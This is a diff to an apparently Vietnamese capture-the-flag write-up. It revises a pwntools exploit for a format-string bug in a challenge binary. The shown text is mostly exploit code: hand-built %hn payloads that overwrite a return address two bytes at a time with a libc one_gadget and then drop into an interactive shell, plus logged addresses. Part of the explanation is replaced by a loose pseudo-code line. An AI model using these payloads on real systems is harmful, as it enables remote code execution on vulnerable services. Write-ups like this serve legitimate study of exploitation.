@@ -111,23 +111,16 @@ ta sẽ sử dụng format string `%n` với `fmtstr_payload` để overwrite ga
 
 và overwrite từng 2 byte một vào return address qua mỗi vòng while (vì viết hết vào thì rất lớn)
 ```python
-for i in range(3):
-    value = (gadget >> (16 * i)) & 0xffff
-    
-    position = return_addr + (i * 2)
-    
-    payload = fmtstr_payload(6, {value: position}, write_size='short')
+i: 1 -> 3
 
-    p.sendline(payload)
-    p.recv()
+part1 = (gadget >> 16*i) & 0xffff
+payload1 = f'%{part1}c%8$hn'.encode()
+payload1 = payload1.ljust(16, b'A')
+payload1 += p64(return_addr + 2*i)
+p.sendline(payload1)
+p.recv()
 ```
-Với:
-```python
-fmtstr_payload(6, {value: position}, write_size='short')
-```
-* `6` là vị trí offset format string trên stack
-* `{value: position}`: value: từng 2 byte, viết tại position: return_addr (+0, +2, +4)
-* `write_size='short'`: short - 2 bytes
+
 Giả sử:
 ```python
 gadget: 0x7f21 dffa 006f
@@ -159,7 +152,7 @@ from pwn import *
 exe = context.binary = ELF('./chall', checksec=False)
 context.log_level = 'info'
 
-libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
+libc = ELF('libc.so.6', checksec=False)
 
 def GDB():
 	gdb.attach(p, gdbscript='''
@@ -190,30 +183,46 @@ log.info(f"Libc base: {hex(libc.address)}")
 
 # shell
 return_addr = buffer + 0x48
+log.info(f"ret addr: {hex(return_addr)}")
 
 # 0xddf43
 # 0xfb062
 # 0xfb06a
 # 0xfb06f
-gadget_offset = 0xfb06f
+gadget_offset = 0x583ec
 gadget = libc.address + gadget_offset
 log.info(f"gadget: {hex(gadget)}")
 
-for i in range(3):
-    val_to_write = (gadget >> (16 * i)) & 0xffff
-    
-    where_to_write = return_addr + (i * 2)
-    
-    payload = fmtstr_payload(6, {where_to_write: val_to_write}, write_size='short')
+part1 = gadget & 0xffff
+payload1 = f'%{part1}c%8$hn'.encode()
+payload1 = payload1.ljust(16, b'A')
+payload1 += p64(return_addr)
+p.sendline(payload1)
+p.recv()
+p.clean(timeout=0.2)
 
-    p.sendline(payload)
-    p.recv()
+part2 = (gadget >> 16) & 0xffff
+payload2 = f'%{part2}c%8$hn'.encode() 
+payload2 = payload2.ljust(16, b'A')
+payload2 += p64(return_addr + 2)
+p.sendline(payload2)
+p.recv()
+p.clean(timeout=0.2)
+
+part3 = (gadget >> 32) & 0xffff
+payload3 = f'%{part3}c%8$hn'.encode()
+payload3 = payload3.ljust(16, b'A')
+payload3 += p64(return_addr + 4)
+p.sendline(payload3)
+p.recv()
+p.clean(timeout=0.2)
 
 p.sendline(b'quit')
 
 p.interactive()
 
-# [*] gadget: 0x7f6b1bee6f43
+# [*] ret addr: 0x7ffdeb5f6258
+# [*] gadget: 0x7fe0af1403ec
 
 ```
 
